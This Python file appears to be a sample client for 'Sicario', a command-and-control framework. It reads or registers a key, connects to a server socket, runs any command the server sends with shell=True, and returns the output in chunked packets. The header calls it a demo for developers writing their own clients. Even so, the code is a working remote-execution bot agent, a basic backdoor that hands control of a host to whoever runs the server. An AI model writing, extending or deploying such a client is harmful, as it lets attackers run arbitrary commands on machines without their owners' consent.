# Sicario dev client 
# Warning: This client shouldn't be used anywhere, its just a presentation to help developers create their own clients
# Also, it lacks a lot of functionality, it can only execute one job at once, and supports only command execution.
# Tl;dr: don't use it, its just a example

import socket, sys, subprocess, math

server_ip = '127.0.0.1'
server_port = 7319

userkey = False

def main(ip, port):
	print('[*] Reading userkey...')

	with open('userkey') as f:
		userkey = f.readline()

	if (len(userkey) != 32):
		print('[!] Userkey is invalid or does not exist')
		userkey = False

	print('[*] Creating socket...')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print('[*] Connecting to server...')

	s.connect((server_ip, server_port))

	print('[*] Performing handshake...')

	if userkey:
		s.send('SC00(login {})'.format(userkey))
	else:
		s.send('SC00(register)')

	response = s.recv(1024)

	if not response:
		print('[*] Got empty response - nothing to do! Exitting...')
		sys.exit(0)

	# response is present, so we gotta parse it
	command = response.split(' ')

	if (command[0] == 'set'):
		if (command[1] == 'key'):
			print('[*] Successfuly registered, key: {}'.format(command[2]))
			with open('userkey', 'w') as f:
				f.write(command[2])
				f.close()
	elif (command[0] == 'execute'):
		print('[*] Server wants us to execute a command')

		cmd = ' '.join(command[1:])

		print('[*] Executing {}'.format(cmd))

		result = subprocess.check_output(cmd, shell=True)
		
		if (len(result) > 2042): # we have to split data into smaller packets
			packet_count = int(math.ceil(len(result)/2042))
			for x in range(packet_count):
				s.send('SC{}({})'.format(str(packet_count-x).zfill(2), result[x*2042:(x+1)*2042]))
		else:
			s.send('SC00({})'.format(result))

	s.recv(2048)
	s.close()



if __name__ == '__main__':
	main(server_ip, server_port) 